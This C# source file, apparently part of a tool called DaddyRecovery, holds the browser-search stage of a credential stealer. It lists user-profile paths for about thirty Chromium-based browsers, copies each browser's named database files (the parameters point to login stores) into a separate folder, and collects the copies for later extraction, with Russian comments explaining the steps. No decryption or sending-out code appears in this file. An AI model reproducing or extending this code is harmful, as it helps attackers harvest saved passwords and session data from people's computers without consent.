namespace DaddyRecovery.Browsers.Chromium
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Text;
    using DaddyRecovery.Helpers;

    public static class Searcher
    {
        /// <summary>
        /// Хранение всех БД файлов 
        /// </summary>
        public static List<string> Database = new List<string>();

        /// <summary>
        /// Коллекция всех базовых путей к файлам 
        /// </summary>
        /// <param name="filename">Имя файла</param>
        /// <returns></returns>
        private static List<string> LCDFiles(string filename)
        {
            var retList = new List<string>
            {
                CombineEx.Inizialze(GlobalPath.AppData, $@"Opera Software\Opera Stable\{filename}"),
                CombineEx.Inizialze(GlobalPath.AppData, $@"Opera Software\Opera Developer\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Opera Software\Opera Neon\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.AppData, $@"Avant Profiles\.default\webkit\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Yandex\YandexBrowser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Google\Chrome\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Comodo\Dragon\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Orbitum\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Torch\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Kometa\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Amigo\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Kinza\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"BraveSoftware\Brave-Browser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"360Browser\Browser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"7Star\7Star\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Chromium\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Iridium\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Nichrome\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"MapleStudio\ChromePlus\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Vivaldi\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Epic Privacy Browser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"CatalinaGroup\Citrio\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"CocCoc\Browser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Sputnik\Sputnik\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"uCozMedia\Uran\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"CentBrowser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Elements Browser\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Superbird\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Chedot\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Suhba\User Data\Default\{filename}"),
                CombineEx.Inizialze(GlobalPath.LocalAppData, $@"Rafotech\Mustang\User Data\Default\{filename}")
            };
            return retList;
        }

        /// <summary>
        /// Сбор всех файлов БД из новой папки
        /// </summary>
        /// <param name="PathLogins"></param>
        /// <param name="Pattern"></param>
        /// <param name="SO"></param>
        private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
        {
            try
            {
                foreach (string Mic in Directory.EnumerateFiles(PathLogins, Pattern, SO))
                {
                    if (CombineEx.ExistsFile(Mic)) // Проверяем каждый файл если он есть
                    {
                        Database.Add(Mic); // Добавляем файлы в коллекцию
                    }
                    continue; 
                }
            }
            catch (Exception) {  }
        }

        /// <summary>
        /// Метод для копирования файлов БД в новую папку ( для безопасного  дальнейшего извлечения данных )
        /// </summary>
        /// <param name="Folder">Имя папки</param>
        /// <param name="filename">Имя файла</param>
        /// <param name="Recursive">Рекурсивное копирование файла</param>
        public static void CopyInSafeDir(string Folder, string filename, bool Recursive = true)
        {
            CombineEx.CreateOrDeleteDirectoryEx(true, Folder, FileAttributes.Normal); // Создаём новую папку куда будем копировать файлы
            foreach (string files in LCDFiles(filename)) // Проходимся по коллекции путей к файлам
            {
                if (CombineEx.ExistsFile(files)) // Проверяем каждый файл
                {
                    try
                    {
                        // Проверяем что файл не пустой
                        if (new FileInfo(files).Length != 0)
                        {
                            // Копируем в новую папку
                            CombineEx.FileCopy(files, CombineEx.Inizialze(Folder, CombineEx.GetFileName(GetApplication.GetNameCycle(files))), Recursive);
                            // Добавляем в новую коллекцию из новой папки ( безопасной )
                            GetSecureFile(Folder, GetApplication.GetNameCycle(files));
                        }
                    }
                    catch { continue; }
                }
                else
                {
                    continue;
                }
            }
        }
    }
}